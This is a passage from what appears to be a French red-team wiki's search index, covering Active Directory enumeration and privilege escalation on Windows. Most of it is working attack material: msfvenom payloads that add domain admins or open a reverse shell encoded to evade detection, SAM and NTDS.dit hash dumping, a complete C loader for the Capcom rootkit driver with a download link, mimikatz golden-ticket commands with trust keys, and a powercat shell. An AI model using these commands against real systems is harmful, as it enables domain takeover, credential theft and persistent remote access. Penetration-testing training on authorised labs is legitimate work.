#powerview\nGet-DomainGroup -Domain test.local #powerview\n---\nGet-ADGroupe -Filter * | select Name #powershell\nGet-AdGroup -Filter * -Properties * #powershell\n</code></pre> <p>Connaitre tout les groupes contenant le mot \"admin\" :</p> <pre><code>Get-DomainGroup *admin* #powerview\n---\nGet-AdGroup -Filter 'Name -like \"*admin*\"' | select Name #powershell\n</code></pre> <p>Connaitre les membres du groupe \"Domain Admins\" :</p> <pre><code>Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse #powerview\n---\nGet-ADGroupMember -Identity \"Domain Admins\" -Recursive #powershell\n</code></pre> <p>Connaitre les groupes dont fait parti un utilisateur :</p> <pre><code>Get-DomainGroup \u2013UserName studentuser1 #powerview\n---\nGet-ADPrincipalGroupMembership -Identity studentuser1 #powershell\n</code></pre> <p>Connaitre les groupes locaux sur une machine (n\u00e9cessite les droits admin sur la machine) :</p> <pre><code>Get-NetLocalGroup -ComputerName us-dc #powerview\n</code></pre> <p>Connaitre les membres de tout les groupes locaux sur une machine (n\u00e9cessite les droits admin) :</p> <pre><code>Get-NetLocalGroupMember -ComputerName us-dc #powerview\n</code></pre> <p>Connaitre les membres du groupe local \"Administrators\" sur une machine (n\u00e9cessite les droits admin) :</p> <pre><code>Get-NetLocalGroupMember -ComputerName us-dc -GroupName Administrators #powerview\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Enumeration/Depuis%20Windows/#gpo","title":"GPO","text":"<p>Lister les GPO du domaine :</p> <pre><code>Get-DomainGPO #powerview\n</code></pre> <p>Lister les GPO qui utilisent les \"restricted groups\" ou \"groups.xml\" :</p> <pre><code>Get-DomainGPOLocalGroup #powerview\n</code></pre> <p>Connaitre les utilisateurs qui sont dans un groupe local d'une machine via GPO :</p> <pre><code>Get-DomainGPOComputerLocalGroupMapping \u2013ComputerIdentity student1.us.techcorp.local #powerview\n</code></pre> <p>Connaitre les machines o\u00f9 un utilisateur est membre d'un groupe :</p> <pre><code>Get-DomainGPOUserLocalGroupMapping -Identity studentuser1 -Verbose #powerview\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Enumeration/Depuis%20Windows/#ou","title":"OU","text":"<p>Lister les OU du domaine :</p> <pre><code>Get-DomainOU #powerview\n---\nGet-ADOrganizationalUnit -Filter * -Properties * #powershell\n</code></pre> <p>Lister les GPO s'appliquant \u00e0 une OU en particulier :</p> <pre><code>Get-DomainGPO -Identity '{7162874B-E6F0-45AD-A3BF-0858DA4FA02F}' #powerview\n</code></pre> <p>Connaitre les utilisateurs membre d'un groupe local sur une machine dans n'importe quelle OU utilisant les GPO :</p> <pre><code>(Get-DomainOU).distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping #powershell\n</code></pre> <p>Idem, mais en ciblant une OU particuli\u00e8re :</p> <pre><code>(Get-DomainOU -Identity 'OU=Mgmt,DC=us,DC=techcorp,DC=local').distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping #powershell\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Enumeration/Depuis%20Windows/#acl","title":"ACL","text":"<p>Connaitre les ACL associ\u00e9es \u00e0 un objet sp\u00e9cifique :</p> <pre><code>Get-DomainObjectAcl -Identity $monuser -ResolveGUIDs #powerview\n</code></pre> <p>Connaitre les ACL associ\u00e9es \u00e0 un objet en sp\u00e9cifiant son chemin LDAP :</p> <pre><code>Get-DomainObjectAcl -Searchbase \"LDAP://CN=Domain Admins,CN=Users,DC=us,DC=techcorp,DC=local\" -ResolveGUIDs -Verbose #powerview\n</code></pre> <p>Idem, en utilisant powershell (les guids ne seront pas r\u00e9solus) :</p> <pre><code>(Get-Acl'AD:\\CN=Administrator,CN=Users,DC=us,DC=techcorp,DC=local').Access #powershell\n</code></pre> <p>Lister les ACEs int\u00e9ressants sur le domaine :</p> <pre><code>Find-InterestingDomainAcl -ResolveGUIDs #powerview\n</code></pre> <p>Connaitre les ACL associ\u00e9es \u00e0 un chemin sp\u00e9cifique :</p> <pre><code>Get-PathAcl -Path \"\\\\dc\\sysvol\" #powerview\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Enumeration/Depuis%20Windows/#trusts","title":"Trusts","text":"<p>rajouter un texte explicatif sur les diff\u00e9rents trusts possibles (transitive forest, one-way / two-way etc...)</p> <p>Connaitre les domaines trust\u00e9s par le domaine courant :</p> <pre><code>Get-DomainTrust #powerview\nGet-DomainTrust -Domain domain.local #powerview\n---\nGet-ADTrust #powershell\nGet-ADTrust -Identity domain.local #powershell\n</code></pre> <p>Avoir des d\u00e9tails sur la for\u00eat actuelle :</p> <pre><code>Get-Forest #powerview\n---\nGet-ADForest #powershell\n</code></pre> <p>Connaitre tout les domaines dans la for\u00eat actuelle :</p> <pre><code>Get-ForestDomain #powerview\n---\n(Get-ADForest).Domains #powershell\n</code></pre> <p>Connaitre le catalogue global de la for\u00eat actuelle :</p> <pre><code>Get-ForestGlobalCatalog #powerview\n---\nGet-ADForest | select -ExpandProperty GlobalCatalogs #powershell\n</code></pre> <p>Connaitre les diff\u00e9rents trusts d'une for\u00eat :</p> <pre><code>Get-ForestTrust #powerview\n---\nGet-ADTrust -Filter 'intraForest -ne $True' -Server (Get-ADforest).Name #powershell\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Enumeration/Depuis%20Windows/#user-hunting","title":"User hunting","text":"<p>Connaitre les pc o\u00f9 un utilisateur a une session :</p> <pre><code>Find-domainUserLocation -Verbose -UserGroupIdentity \"$utilisateur\" #powerview\n</code></pre> <p>Connaitre les pc o\u00f9 l'utilisateur a un acc\u00e8s admin :</p> <pre><code>Find-DomainUserLocation -CheckAccess -UserGroupIdentity \"$utilisateur\" #powerview\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Backup%20Operator/","title":"Backup Operator","text":"<p>https://github.com/giuliano108/SeBackupPrivilege</p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Backup%20Operator/#importation-des-dll-du-poc","title":"Importation des DLL du PoC","text":"<ul> <li> <p>Commandes PowerShell :\u00a0`Import-Module .\\SeBackupPrivilegeUtils.dll     ``Import-Module .\\SeBackupPrivilegeCmdLets.dll  </p> </li> <li> <p>Description :\u00a0Importe les modules n\u00e9cessaires pour exploiter le privil\u00e8ge de sauvegarde de s\u00e9curit\u00e9 (SeBackupPrivilege).</p> </li> </ul>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Backup%20Operator/#verification-du-statut-du-privilege","title":"V\u00e9rification du Statut du Privil\u00e8ge","text":"<ul> <li>Commande PowerShell : <code>Get-SeBackupPrivilege</code></li> <li>Description :\u00a0Affiche si le privil\u00e8ge de sauvegarde est activ\u00e9 ou d\u00e9sactiv\u00e9 pour l'utilisateur actuel.</li> </ul>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Backup%20Operator/#activation-du-privilege","title":"Activation du Privil\u00e8ge","text":"<ul> <li>Commande PowerShell : <code>Set-SeBackupPrivilege</code></li> <li>Description :\u00a0Active le privil\u00e8ge de sauvegarde pour l'utilisateur actuel.</li> </ul>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Backup%20Operator/#copie-de-fichiers-proteges","title":"Copie de Fichiers Prot\u00e9g\u00e9s","text":"<ul> <li> <p>Commande PowerShell : <code>Copy-FileSeBackupPrivilege 'C:\\Confidential\\2021 Contract.txt' .\\Contract.txt</code> </p> </li> <li> <p>Description :\u00a0Utilise le privil\u00e8ge de sauvegarde pour copier un fichier normalement prot\u00e9g\u00e9 par des droits d'acc\u00e8s restreints.</p> </li> </ul>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Backup%20Operator/#extraction-des-informations-de-sam-et-system","title":"Extraction des Informations de SAM et SYSTEM","text":"<p>Sauvegarde des Clefs de Registre SYSTEM et SAM</p> <ul> <li> <p>Commandes PowerShell : <code>reg save HKLM\\SAM SAM.SAV reg save HKLM\\SYSTEM SYSTEM.SAV</code> </p> </li> <li> <p>Description :\u00a0Cr\u00e9e une sauvegarde des ruches de registre SAM et SYSTEM, contenant des informations sur les comptes locaux et les configurations syst\u00e8me.</p> </li> </ul>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Backup%20Operator/#extraction-des-informations","title":"Extraction des Informations","text":"<ul> <li> <p>Commande Bash : <code>secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL</code> </p> </li> <li> <p>Description :\u00a0Utilise\u00a0<code>secretsdump.py</code>\u00a0pour extraire des informations, telles que des hashes de mots de passe, \u00e0 partir des fichiers sauvegard\u00e9s.</p> </li> </ul>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Backup%20Operator/#acces-a-la-base-de-donnees-active-directory","title":"Acc\u00e8s \u00e0 la Base de Donn\u00e9es Active Directory","text":"<p>Copie de NTDS.dit</p> <ul> <li> <p>Commandes PowerShell : <code>Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit C:\\Tools\\ntds.dit</code>\u00a0ou\u00a0<code>robocopy /B E:\\Windows\\NTDS .\\ntds ntds.dit</code> </p> </li> <li> <p>Description :\u00a0Copie la base de donn\u00e9es NTDS.dit, qui contient les informations des utilisateurs et mots de passe de l'Active Directory, en utilisant le privil\u00e8ge de sauvegarde.</p> </li> </ul>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Dnsadmin/","title":"Dnsadmin","text":"<p>Le groupe DnsAdmins permet une administration partielle des services DNS sur un domaine Windows. Ce groupe peut \u00e9galement \u00eatre exploit\u00e9 pour une \u00e9l\u00e9vation de privil\u00e8ges, en raison de la capacit\u00e9 \u00e0 charger des biblioth\u00e8ques DLL arbitraires dans le processus du service DNS.</p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Dnsadmin/#implications-en-matiere-de-securite","title":"Implications en mati\u00e8re de s\u00e9curit\u00e9","text":"<p>L'abus de ce privil\u00e8ge peut permettre une \u00e9l\u00e9vation de privil\u00e8ges \u00e0\u00a0<code>NT AUTHORITY\\SYSTEM</code>, le niveau de privil\u00e8ge le plus \u00e9lev\u00e9 sur un syst\u00e8me Windows. C'est parce que le service DNS s'ex\u00e9cute sous ce compte utilisateur.</p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Dnsadmin/#generation-du-dll","title":"G\u00e9n\u00e9ration du .DLL","text":"<p>Le premier pas est de g\u00e9n\u00e9rer un fichier DLL qui, lorsqu'il est charg\u00e9, ex\u00e9cutera un code arbitraire. Vous pouvez utiliser msfvenom pour cela :</p> <pre><code>msfvenom -p windows/x64/exec cmd='net group \"domain admins\" netadm /add /domain' -f dll -o adduser.dll\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Dnsadmin/#transfert-du-dll-et-injection","title":"Transfert du .DLL et Injection","text":"<p>Apr\u00e8s avoir transf\u00e9r\u00e9 le fichier\u00a0<code>.dll</code>\u00a0sur la machine cible, utilisez\u00a0<code>dnscmd.exe</code>\u00a0pour configurer le serveur DNS afin qu'il charge la DLL :</p> <pre><code>dnscmd.exe /config /serverlevelplugindll C:\\Users\\netadm\\Desktop\\adduser.dll\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Dnsadmin/#redemarrage-du-service-dns","title":"Red\u00e9marrage du service DNS","text":"<p>Apr\u00e8s avoir configur\u00e9 la DLL, il vous faudra red\u00e9marrer le service DNS pour que la DLL soit charg\u00e9e et ex\u00e9cut\u00e9e.</p> <p>Pour arr\u00eater le service DNS :</p> <pre><code>sc stop dns\n</code></pre> <p>Pour d\u00e9marrer le service DNS :</p> <pre><code>sc start dns\n</code></pre> <p>Note de s\u00e9curit\u00e9: Cette technique est souvent d\u00e9tect\u00e9e par des solutions EDR (Endpoint Detection and Response) ou des outils de surveillance. Elle ne doit \u00eatre utilis\u00e9e qu'avec une autorisation appropri\u00e9e, dans un environnement contr\u00f4l\u00e9.</p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Print%20Operator/","title":"Print Operator","text":"<p>Le groupe \"print operator\" permet d'avoir le privil\u00e8ge \"SeLoadDriverPrivilege\" ce qui donne le droit de manager des imprimantes.</p> <pre><code>reg add hkcu\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d \"\\??\\C:\\test\\Capcom.sys\"\nreg add hkcu\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1\n</code></pre> <p>Cr\u00e9ation d'un drivers, \u00e0 compiler:</p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;assert.h&gt;\n#include &lt;winternl.h&gt;\n#include &lt;sddl.h&gt;\n#pragma comment(lib,\"advapi32.lib\") \n#pragma comment(lib,\"user32.lib\") \n#pragma comment(lib,\"Ntdll.lib\")\n#include &lt;windows.h&gt;\n#include &lt;assert.h&gt;\n#include &lt;winternl.h&gt;\n#include &lt;sddl.h&gt;\n#include &lt;stdio.h&gt;\n#include \"tchar.h\"\n\nLPWSTR getUserSid(HANDLE hToken)\n{\n\n    // Get the size of the memory buffer needed for the SID\n    //https://social.msdn.microsoft.com/Forums/vstudio/en-US/6b23fff0-773b-4065-bc3f-d88ce6c81eb0/get-user-sid-in-unmanaged-c?forum=vcgeneral\n    //https://msdn.microsoft.com/en-us/library/windows/desktop/aa379554(v=vs.85).aspx\n\n    DWORD dwBufferSize = 0;\n    if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &amp;dwBufferSize) &amp;&amp;\n        (GetLastError() != ERROR_INSUFFICIENT_BUFFER))\n    {\n        wprintf(L\"GetTokenInformation failed, error: %d\\n\",\n            GetLastError());\n        return NULL;\n    }\n\n    //https://social.msdn.microsoft.com/Forums/vstudio/en-US/6b23fff0-773b-4065-bc3f-d88ce6c81eb0/get-user-sid-in-unmanaged-c?forum=vcgeneral\n    PTOKEN_USER pUserToken = (PTOKEN_USER)HeapAlloc(\n        GetProcessHeap(),\n        HEAP_ZERO_MEMORY,\n        dwBufferSize);\n\n    if (pUserToken == NULL) {\n        HeapFree(GetProcessHeap(), 0, (LPVOID)pUserToken);\n        return NULL;\n    }\n\n    // Retrive token info\n    if (!GetTokenInformation(\n        hToken,\n        TokenUser,\n        pUserToken,\n        dwBufferSize,\n        &amp;dwBufferSize))\n    {\n        GetLastError();\n        return NULL;\n    }\n\n    // Check if SID is valid\n    if (!IsValidSid(pUserToken-&gt;User.Sid))\n    {\n        wprintf(L\"The owner SID is invalid.\\n\");\n        return NULL;\n    }\n\n    LPWSTR sidString;\n    ConvertSidToStringSidW(pUserToken-&gt;User.Sid, &amp;sidString);\n    return sidString;\n}\n\nULONG\nLoadDriver(HANDLE hToken)\n{\n    UNICODE_STRING DriverServiceName;\n    ULONG dwErrorCode;\n    NTSTATUS status;\n\n    typedef NTSTATUS(_stdcall *NT_LOAD_DRIVER)(IN PUNICODE_STRING DriverServiceName);\n    typedef void (WINAPI* RTL_INIT_UNICODE_STRING)(PUNICODE_STRING, PCWSTR);\n\n    NT_LOAD_DRIVER NtLoadDriver = (NT_LOAD_DRIVER)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtLoadDriver\");\n    RTL_INIT_UNICODE_STRING RtlInitUnicodeString = (RTL_INIT_UNICODE_STRING)GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"RtlInitUnicodeString\");\n\n    LPWSTR win7regPath = new WCHAR[MAX_PATH];\n    ZeroMemory(win7regPath, MAX_PATH);\n    LPWSTR userSidStr;\n    userSidStr = getUserSid(hToken);\n    if (userSidStr == NULL)\n    {\n        wprintf(L\"[+] Error while getting user SID\\n\");\n        CloseHandle(hToken);\n        hToken = NULL;\n    }\n\n    lstrcat(win7regPath, L\"\\\\Registry\\\\User\\\\\");\n    lstrcat(win7regPath, userSidStr);\n    lstrcat(win7regPath, L\"\\\\System\\\\CurrentControlSet\\\\CAPCOM\");\n\n    RtlInitUnicodeString(&amp;DriverServiceName, win7regPath);\n\n    status = NtLoadDriver(&amp;DriverServiceName);\n    printf(\"NTSTATUS: %08x, WinError: %d\\n\", status, GetLastError());\n\n    if (!NT_SUCCESS(status))\n        return RtlNtStatusToDosError(status);\n\n    return 0;\n}\n\nint IsTokenSystem(HANDLE tok)\n{\n    DWORD Size, UserSize, DomainSize;\n    SID *sid;\n    SID_NAME_USE SidType;\n    TCHAR UserName[64], DomainName[64];\n    TOKEN_USER *User;\n    Size = 0;\n    GetTokenInformation(tok, TokenUser, NULL, 0, &amp;Size);\n    if (!Size)\n        return 0;\n\n    User = (TOKEN_USER *)malloc(Size);\n    assert(User);\n    GetTokenInformation(tok, TokenUser, User, Size, &amp;Size);\n    assert(Size);\n    Size = GetLengthSid(User-&gt;User.Sid);\n    assert(Size);\n    sid = (SID *)malloc(Size);\n    assert(sid);\n\n    CopySid(Size, sid, User-&gt;User.Sid);\n    UserSize = (sizeof UserName / sizeof *UserName) - 1;\n    DomainSize = (sizeof DomainName / sizeof *DomainName) - 1;\n    LookupAccountSid(NULL, sid, UserName, &amp;UserSize, DomainName, &amp;DomainSize, &amp;SidType);\n    free(sid);\n\n    printf(\"whoami:\\n%S\\\\%S\\n\", DomainName, UserName);\n    if (!_wcsicmp(UserName, L\"SYSTEM\"))\n        return 0;\n    return 1;\n}\n\nVOID RetPrivDwordAttributesToStr(DWORD attributes, LPTSTR szAttrbutes)\n{\n    UINT len = 0;\n    if (attributes &amp; SE_PRIVILEGE_ENABLED)\n        len += wsprintf(szAttrbutes, TEXT(\"Enabled\"));\n    if (attributes &amp; SE_PRIVILEGE_ENABLED_BY_DEFAULT)\n        len += wsprintf(szAttrbutes, TEXT(\"Enabled by default\"));\n    if (attributes &amp; SE_PRIVILEGE_REMOVED)\n        len += wsprintf(szAttrbutes, TEXT(\"Removed\"));\n    if (attributes &amp; SE_PRIVILEGE_USED_FOR_ACCESS)\n        len += wsprintf(szAttrbutes, TEXT(\"Used for access\"));\n    if (szAttrbutes[0] == 0)\n        wsprintf(szAttrbutes, TEXT(\"Disabled\"));\n    return;\n}\n\nint GetTokenPrivilege(HANDLE tok)\n{\n    PTOKEN_PRIVILEGES ppriv = NULL;\n    DWORD dwRet = 0;\n    GetTokenInformation(tok, TokenGroups, ppriv, dwRet, &amp;dwRet);\n    if (!dwRet)\n        return 0;\n    ppriv = (PTOKEN_PRIVILEGES)calloc(dwRet, 1);\n    GetTokenInformation(tok, TokenPrivileges, ppriv, dwRet, &amp;dwRet);\n    printf(\"\\nwhoami /priv\\n\");\n    for (int i = 0; i &lt; ppriv-&gt;PrivilegeCount; i++)\n    {\n        TCHAR lpszPriv[MAX_PATH] = { 0 };\n        DWORD dwRet = MAX_PATH;\n        BOOL n = LookupPrivilegeName(NULL, &amp;(ppriv-&gt;Privileges[i].Luid), lpszPriv, &amp;dwRet);\n        printf(\"%-50ws\", lpszPriv);\n        TCHAR lpszAttrbutes[1024] = { 0 };\n        RetPrivDwordAttributesToStr(ppriv-&gt;Privileges[i].Attributes, lpszAttrbutes);\n        printf(\"%ws\\n\", lpszAttrbutes);\n    }\n    return 1;\n}\n\nBOOL EnablePriv(HANDLE hToken, LPCTSTR priv)\n{\n\n    TOKEN_PRIVILEGES tp;\n    LUID luid;\n\n    if (!LookupPrivilegeValue(NULL, priv, &amp;luid))\n    {\n        printf(\"[!]LookupPrivilegeValue error\\n\");\n        return 0;\n    }\n    tp.PrivilegeCount = 1;\n    tp.Privileges[0].Luid = luid;\n    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;\n    if (!AdjustTokenPrivileges(hToken, FALSE, &amp;tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))\n    {\n        printf(\"[!]AdjustTokenPrivileges error\\n\");\n        return 0;\n    }\n\n    IsTokenSystem(hToken);\n    GetTokenPrivilege(hToken);\n\n    return TRUE;\n}\n\nint _tmain(int argc, _TCHAR* argv[])\n{\n    HANDLE hToken;\n    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &amp;hToken))\n    {\n        printf(\"[!]OpenProcessToken error\\n\");\n        return 0;\n    }\n\n    EnablePriv(hToken, SE_LOAD_DRIVER_NAME);\n    LoadDriver(hToken);\n    return 0;\n}\n</code></pre> <p>T\u00e9l\u00e9charger ensuite le driver Capcom.sys, ici:\u00a0https://github.com/FuzzySecurity/Capcom-Rootkit/raw/master/Driver/Capcom.sys </p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Server%20Operators/","title":"Server Operators","text":"<p>Le r\u00f4le de \"Server Operator\" permet une administration partielle du serveur, mais sans les privil\u00e8ges \u00e9tendus d'un \"Domain Admin\". Ce groupe donne acc\u00e8s \u00e0 divers privil\u00e8ges, dont \"SeBackupPrivilege\" et \"SeRestorePrivilege\", et permet \u00e9galement de contr\u00f4ler les services locaux du serveur.</p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Server%20Operators/#privileges","title":"Privileges","text":"<ul> <li><code>SeBackupPrivilege</code>: Ce privil\u00e8ge permet de contourner la v\u00e9rification des autorisations de fichier pour effectuer des op\u00e9rations de sauvegarde.    </li> <li><code>SeRestorePrivilege</code>: Ce privil\u00e8ge permet de contourner la v\u00e9rification des autorisations de fichier pour effectuer des op\u00e9rations de restauration.  </li> </ul>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Server%20Operators/#verifier-lutilisateur-sous-lequel-un-service-est-lance","title":"V\u00e9rifier l'utilisateur sous lequel un service est lanc\u00e9","text":"<p>Pour v\u00e9rifier les d\u00e9tails de configuration d'un service, y compris l'utilisateur sous lequel il est ex\u00e9cut\u00e9 :</p> <pre><code>sc qc $NomDeLapp # Remplacez $NomDeLapp par le nom du service que vous voulez inspecter\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Server%20Operators/#modifier-le-binaire-execute-par-un-service","title":"Modifier le binaire ex\u00e9cut\u00e9 par un service","text":"<p>Si vous voulez changer le binaire que le service ex\u00e9cute lors de son d\u00e9marrage :</p> <pre><code>sc config $NomDeLapp binPath= \"cmd /c net localgroup Administrators server_adm /add\" # Remplacez $NomDeLapp et server_adm par les valeurs appropri\u00e9es`\n</code></pre> <p>Note: Faites attention lors de la modification du chemin du binaire d'un service. Une mauvaise configuration peut rendre le service ou m\u00eame le serveur inutilisable.</p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Server%20Operators/#arreter-et-demarrer-un-service","title":"Arr\u00eater et d\u00e9marrer un service","text":"<p>Pour arr\u00eater un service :</p> <pre><code>sc stop $NomDeLApp # Remplacez $NomDeLApp par le nom du service que vous voulez arr\u00eater\n</code></pre> <p>Pour d\u00e9marrer un service :</p> <pre><code>sc start $NomDeLApp # Remplacez $NomDeLApp par le nom du service que vous voulez d\u00e9marrer\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Groupes/Server%20Operators/#implications-en-matiere-de-securite","title":"Implications en mati\u00e8re de s\u00e9curit\u00e9","text":"<p>L'appartenance \u00e0 ce groupe peut \u00eatre dangereuse si elle est accord\u00e9e \u00e0 des utilisateurs non autoris\u00e9s ou non fiables. Un utilisateur malveillant pourrait abuser de ces privil\u00e8ges pour \u00e9lever ses droits sur le serveur.</p>"},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Trust/Bidirectionnal/","title":"Bidirectionnal","text":""},{"location":"Red%20Team/4%20-%20Windows/Active%20Directory/Trust/Bidirectionnal/#trust-bidirectionnal-child-parent","title":"trust bidirectionnal, child -&gt; parent","text":"<p>Une fois qu'on a le contr\u00f4le d'un premier DC, s'y connecter et avec mimikatz:</p> <pre><code>lsadump::trust /patch\n</code></pre> <p>Ce qui permet de trouver les SID dont nous auront besoin, ainsi que la trustkey.</p> <p>Ensuite, toujours avec mimikatz:</p> <pre><code>kerberos::golden /user:Administrator /domain:child.internal.local /sid:S-1-5-21-3056178012-3972705859-491075245 /sids:S-1-5-21-2734290894-461713716-141835440-519 /rc4:bd0e4bd0efde459162c036970ef3489e /target:internal.local /ticket:C:\\Windows\\test.kirbi /service:krbtgt\n</code></pre> <p>/domain: le domaine dont nous avons le contr\u00f4le /sid: le sid du domaine dont nous avons le contr\u00f4le /sids: le sid du domaine vis\u00e9 (/!\\ on rajoute -519, qui correspond au groupe \"enterprise admin\") /target: le domaine vis\u00e9 /rc4: la trustkey</p> <p>On r\u00e9cup\u00e8re ensuite le .kirbi sur notre host et on le converti en .ccache:</p> <pre><code>impacket-ticketconverter test.kirbi test.ccache\n</code></pre> <p>On l'exporte:</p> <pre><code>export KRB5CCNAME=test.ccache\n</code></pre> <p>Nous pouvons ensuite faire le request d'un TGS sur le DC principal:</p> <pre><code>impacket-getST -k -no-pass -spn HOST/DC01 internal.local/Administrator@child.internal.local\n</code></pre> <p>On l'exporte \u00e0 son tour -&gt; profit.</p> <p>/!\\ nous sommes toujours Administrateur du domaine child, mais avec les droits sur le domaine parent, ce qui implique qu'il faut sp\u00e9cifier le nom du domaine dans certains cas, typiquement:</p> <pre><code>crackmapexec smb 192.168.210.10 --use-kcache -d child.internal.local\n</code></pre>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/Always%20Install%20Elevated/","title":"Always Install Elevated","text":""},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/Always%20Install%20Elevated/#verification-du-parametre-alwaysinstallelevated","title":"V\u00e9rification du Param\u00e8tre\u00a0<code>AlwaysInstallElevated</code>","text":"<ul> <li> <p>Description :\u00a0Le param\u00e8tre\u00a0<code>AlwaysInstallElevated</code>\u00a0permet l'installation de programmes MSI avec des privil\u00e8ges \u00e9lev\u00e9s sans requ\u00e9rir explicitement les droits d'administrateur. Si activ\u00e9, il peut \u00eatre exploit\u00e9 pour obtenir une \u00e9l\u00e9vation de privil\u00e8ge.</p> </li> <li> <p>Commandes de V\u00e9rification :</p> </li> </ul> <pre><code>reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated \nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n</code></pre> <p>Ces commandes v\u00e9rifient si le param\u00e8tre est activ\u00e9 dans les registres HKCU (HKEY_CURRENT_USER) et HKLM (HKEY_LOCAL_MACHINE). Une r\u00e9ponse \"0x1\" indique que le param\u00e8tre est activ\u00e9.  </p> <p>Cr\u00e9ation d'un Reverse Shell avec MSFVenom</p> <ul> <li> <p>Commande : <code>msfvenom --platform windows --arch x64 --payload windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=6666 --encoder x64/xor --iterations 9 --format msi --out AlwaysInstallElevated.msi</code> </p> </li> <li> <p>Description :\u00a0Cette commande utilise MSFVenom pour cr\u00e9er un fichier MSI contenant un payload de reverse shell. Le fichier MSI peut ensuite \u00eatre ex\u00e9cut\u00e9 sur la machine cible pour obtenir un shell avec des privil\u00e8ges \u00e9lev\u00e9s.</p> </li> <li>D\u00e9tails :</li> <li><code>--platform windows</code>\u00a0et\u00a0<code>--arch x64</code>\u00a0sp\u00e9cifient la plateforme et l'architecture cible.</li> <li><code>--payload windows/x64/shell_reverse_tcp</code>\u00a0d\u00e9finit le payload pour un reverse shell TCP.</li> <li><code>LHOST=tun0</code>\u00a0et\u00a0<code>LPORT=6666</code>\u00a0d\u00e9finissent l'adresse et le port de l'\u00e9couteur sur l'attaquant.</li> <li><code>--encoder x64/xor</code>\u00a0et\u00a0<code>--iterations 9</code>\u00a0appliquent un encodage pour \u00e9chapper \u00e0 la d\u00e9tection.</li> <li><code>--format msi</code>\u00a0sp\u00e9cifie le format de sortie comme MSI.</li> <li><code>--out AlwaysInstallElevated.msi</code>\u00a0nomme le fichier de sortie.</li> </ul> <p>Exploitation</p> <ul> <li>Ex\u00e9cution du Fichier MSI :\u00a0Une fois le fichier MSI cr\u00e9\u00e9, il peut \u00eatre ex\u00e9cut\u00e9 sur la machine cible. Si\u00a0<code>AlwaysInstallElevated</code>\u00a0est activ\u00e9, le reverse shell sera lanc\u00e9 avec des privil\u00e8ges \u00e9lev\u00e9s.</li> </ul>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/Compte%20de%20service%20avec%20peu%20de%20privil%C3%A8ges/","title":"Compte de service avec peu de privil\u00e8ges","text":"<p>Dans certains cas, un ex\u00e9cutable peut \u00eatre lanc\u00e9 avec un compte de service tout en excluant certains des privil\u00e8ges dont il dispose, par exemple :</p> <p></p> <p>Ce qui fait que nous pouvons \u00e9ventuellement avoir un contr\u00f4le de ce compte, mais sans ses privil\u00e8ges associ\u00e9s.</p>"},{"location":"Red%20Team/4%20-%20Windows/Privil%C3%A8ges/Compte%20de%20service%20avec%20peu%20de%20privil%C3%A8ges/#reactiver-les-privileges-avec-une-tache-planifiee","title":"R\u00e9activer les privil\u00e8ges avec une t\u00e2che planifi\u00e9e","text":"<p>L'astuce consiste en la cr\u00e9ation d'une t\u00e2che planifi\u00e9e avec ce compte (par exemple l'ex\u00e9cution d'un nouveau reverse-shell) : la t\u00e2ch\u00e9 planifi\u00e9e se lancera avec le compte de service \"nature peinture\" et donc avec ses privil\u00e8ges habituels.</p> <pre><code>$TaskAction = New-ScheduledTaskAction -Execute \"powershell.exe\" -Argument \"-Exec Bypass -Command `\". C:\\TOOLS\\powercat.ps1; powercat -l -p 7002 -ep`\"\"\n</code></pre> 